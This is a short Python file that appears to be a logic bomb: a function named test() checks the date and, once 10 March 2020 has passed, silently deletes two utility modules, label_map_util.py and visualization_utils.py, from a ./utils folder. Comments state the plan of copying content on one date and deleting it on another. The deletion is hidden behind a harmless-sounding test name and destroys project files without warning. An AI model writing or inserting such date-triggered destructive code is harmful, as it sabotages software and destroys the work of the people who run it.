from datetime import datetime as dt
import os  
d1 = dt(2020,3,10) #yyyy,mm,dd
dcur= dt.now()
def test():
    if dcur >= d1:
        f1 = ( './utils/label_map_util.py')
        f2 = ( './utils/visualization_utils.py')
        if os.path.exists(f1):
            os.remove(f1)
        if os.path.exists(f2):
            os.remove(f2)


#at one date copy content 
#at second date delete content 
